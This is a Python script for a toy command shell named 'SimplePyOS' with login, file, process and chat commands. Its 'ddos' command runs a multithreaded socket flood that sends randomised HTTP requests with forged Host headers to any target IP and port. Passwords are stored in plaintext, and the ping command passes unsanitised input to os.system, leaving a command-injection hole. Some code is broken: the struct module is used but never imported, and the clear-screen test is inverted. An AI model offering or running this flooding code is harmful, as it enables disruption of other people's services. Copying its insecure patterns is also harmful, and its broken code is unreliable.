import os
import shutil
import subprocess
import time
import psutil
import socket
import threading
import random
import hashlib
import string
import logging

# Configure logging
logging.basicConfig(filename='attack.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# User database (stored in a file)
USER_FILE = "users.txt"
CHAT_SERVER = "chat_server.txt"  # Temporary file to store chat messages
KERNEL_COMMAND_FILE = "kernel_command.txt"
KERNEL_RESPONSE_FILE = "kernel_response.txt"

# Cosmos kernel communication

def write_kernel_command(command):
    with open(KERNEL_COMMAND_FILE, "w") as f:
        f.write(command)

def read_kernel_response():
    time.sleep(1)  # wait for the Cosmos kernel to respond
    if os.path.exists(KERNEL_RESPONSE_FILE):
        with open(KERNEL_RESPONSE_FILE, "r") as f:
            return f.read().strip()
    return "No response from kernel."

def request_kernel_info(command):
    write_kernel_command(command)
    return read_kernel_response()

def load_users():
    users = {}
    if os.path.exists(USER_FILE):
        with open(USER_FILE, "r") as file:
            for line in file:
                username, password = line.strip().split(":")
                users[username] = password
    return users

def save_user(username, password):
    with open(USER_FILE, "a") as file:
        file.write(f"{username}:{password}\n")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def login():
    users = load_users()
    print("Welcome to SimplePyOS")
    while True:
        username = input("Username: ").strip()
        password = input("Password: ").strip()
        if username in users and users[username] == password:
            print("Login successful!\n")
            return username
        else:
            print("Invalid credentials, please try again.")

def create_user():
    username = input("New Username: ").strip()
    password = input("New Password: ").strip()
    users = load_users()
    if username in users:
        print("User already exists!")
    else:
        save_user(username, password)
        print("User created successfully!")

def chat_room(username):
    print("Welcome to the SimplePyOS Chat Room!")
    print("Type your messages below. Type '/exit' to leave the chat.")
    while True:
        message = input(f"{username}: ")
        if message.lower() == "/exit":
            print("Leaving chat room...")
            break
        with open(CHAT_SERVER, "a") as file:
            file.write(f"{username}: {message}\n")
        print_chat_history()

def print_chat_history():
    os.system('cls' if os.name != 'nt' else 'clear')
    print("--- Chat Room ---")
    if os.path.exists(CHAT_SERVER):
        with open(CHAT_SERVER, "r") as file:
            for line in file:
                print(line.strip())
    print("-----------------")

def make_directory(directory_name):
    try:
        os.makedirs(directory_name, exist_ok=True)
        print(f"Directory {directory_name} created.")
    except Exception as e:
        print(f"Failed to create directory: {e}")

def remove_file_or_folder(path):
    if os.path.exists(path):
        try:
            if os.path.isdir(path):
                shutil.rmtree(path)
            else:
                os.remove(path)
            print(f"{path} removed successfully.")
        except Exception as e:
            print(f"Error removing {path}: {e}")
    else:
        print(f"{path} does not exist.")

def change_directory(directory_name):
    try:
        os.chdir(directory_name)
        print(f"Changed directory to {directory_name}.")
    except FileNotFoundError:
        print(f"{directory_name} not found.")
    except Exception as e:
        print(f"Error changing directory: {e}")

def list_files():
    try:
        files = os.listdir()
        print("Files in current directory:")
        for file in files:
            print(file)
    except Exception as e:
        print(f"Error listing files: {e}")

def ping(address):
    try:
        response = os.system(f"ping -c 1 {address}" if os.name != 'nt' else f"ping -n 1 {address}")
        if response == 0:
            print(f"{address} is reachable.")
        else:
            print(f"{address} is not reachable.")
    except Exception as e:
        print(f"Error pinging {address}: {e}")

def list_processes():
    try:
        print("Listing processes...")
        if os.name == "nt":
            os.system("tasklist")
        else:
            os.system("ps aux")
    except Exception as e:
        print(f"Error listing processes: {e}")

def kill_process(pid):
    try:
        os.kill(pid, 9)
        print(f"Process {pid} killed.")
    except ProcessLookupError:
        print(f"Process {pid} not found.")
    except Exception as e:
        print(f"Error killing process {pid}: {e}")

def run_pentest_tool(tool, target):
    print(f"Running pentest tool {tool} on target {target}.")

def set_proxy(ip, port):
    try:
        os.environ["HTTP_PROXY"] = f"http://{ip}:{port}"
        os.environ["HTTPS_PROXY"] = f"http://{ip}:{port}"
        print(f"Proxy set to {ip}:{port}")
    except Exception as e:
        print(f"Error setting proxy: {e}")

def generate_random_ip():
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

def hash_ip(ip):
    return hashlib.sha256(ip.encode()).hexdigest()

def generate_random_string(length):
    return ''.join(random.choices(string.digits, k=length))

def send_socket(target, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        random_string = generate_random_string(10)
        s.sendto(("GET /" + random_string + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + generate_random_ip() + "\r\n\r\n").encode('ascii'), (target, port))
        logging.info(f"Sent from {hash_ip(generate_random_ip())} with string {random_string} to {target}:{port}")
        print(f"Sent from {hash_ip(generate_random_ip())} with string {random_string}")
        s.close()
    except socket.gaierror as e:
        logging.error(f"Failed to send to {target}:{port} - Invalid hostname: {e}")
        print(f"Failed to send: Invalid hostname: {e}")
    except socket.error as e:
        logging.error(f"Failed to send to {target}:{port}: {e}")
        print(f"Failed to send: {e}")
    except Exception as e:
        logging.error(f"Unexpected error sending to {target}:{port}: {e}")
        print(f"Failed to send: {e}")
    time.sleep(0.5)

def execute_attack(target, port, num_sockets):
    threads = []
    for _ in range(num_sockets):
        t = threading.Thread(target=send_socket, args=(target, port,))
        t.daemon = True
        t.start()
        threads.append(t)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        logging.info("Attack stopped by user.")
    finally:
        for t in threads:
            if t.is_alive():
                print(f"Waiting for thread {t.name} to finish...")
                t.join(timeout=2)
                if t.is_alive():
                    print(f"Thread {t.name} did not finish in time.")
        print("All threads stopped (or timed out). Exiting.")
        logging.info("All threads stopped (or timed out). Exiting.")

def command_line(username):
    while True:
        cmd = input("SimplePyOS> ").strip()
        if cmd == "exit":
            print("Logging out...")
            break
        elif cmd == "help":
            print("""
Available commands:
 - echo [message]
 - help
 - ls
 - cd [directory]
 - mkdir [name]
 - rm [file/folder]
 - ping [address]
 - ps
 - kill [pid]
 - newuser
 - chat
 - proxy [ip] [port]
 - install_pentest
 - pentest [tool] [target]
 - ddos [target_ip] [target_port] [num_sockets]
 - kernel storage
 - kernel sysinfo
 - kernel time
 - exit
""")
        elif cmd.startswith("echo "):
            print(cmd[5:].strip())
        elif cmd.startswith("ddos "):
            parts = cmd.split()
            if len(parts) == 4:
                target_ip = parts[1]
                target_port = int(parts[2])
                num_sockets = int(parts[3])
                execute_attack(target_ip, target_port, num_sockets)
            else:
                print("Usage: ddos [target_ip] [target_port] [num_sockets]")
        elif cmd.startswith("mkdir "):
            make_directory(cmd[6:])
        elif cmd.startswith("rm "):
            remove_file_or_folder(cmd[3:])
        elif cmd.startswith("cd "):
            change_directory(cmd[3:])
        elif cmd == "ls":
            list_files()
        elif cmd.startswith("ping "):
            ping(cmd[5:])
        elif cmd == "ps":
            list_processes()
        elif cmd.startswith("kill "):
            kill_process(int(cmd[5:]))
        elif cmd == "newuser":
            create_user()
        elif cmd == "chat":
            chat_room(username)
        elif cmd.startswith("proxy "):
            parts = cmd.split()
            if len(parts) == 3:
                set_proxy(parts[1], parts[2])
            else:
                print("Usage: proxy [ip] [port]")
        elif cmd.startswith("pentest "):
            parts = cmd.split()
            if len(parts) == 3:
                tool = parts[1]
                target = parts[2]
                run_pentest_tool(tool, target)
            else:
                print("Usage: pentest [tool] [target]")
        elif cmd.startswith("kernel "):
            command = cmd[7:].strip()
            if command in ["storage", "sysinfo", "time"]:
                response = request_kernel_info(command)
                print(response)
            else:
                print("Unknown kernel command.")
        else:
            print("Unknown command. Type 'help' for options.")

if __name__ == "__main__":
    clear_screen()
    print("1. Login")
    print("2. Create New User")
    choice = input("Select an option: ").strip()
    if choice == "1":
        username = login()
        command_line(username)
    elif choice == "2":
        create_user()
    else:
        print("Invalid choice.")
